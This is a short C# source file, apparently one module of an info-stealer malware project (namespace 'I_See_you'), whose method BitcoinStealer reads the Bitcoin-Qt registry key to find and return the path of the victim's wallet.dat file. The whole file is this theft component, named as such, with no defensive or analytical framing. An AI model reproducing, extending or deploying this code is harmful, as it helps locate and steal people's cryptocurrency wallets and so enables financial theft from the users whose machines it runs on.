using Microsoft.Win32;

namespace I_See_you
{
    class Wallet
    {
        public static string BitcoinStealer()
        {
            string result;
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    result = registryKey.GetValue("strDataDir") + "wallet.dat";
                }
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }
}
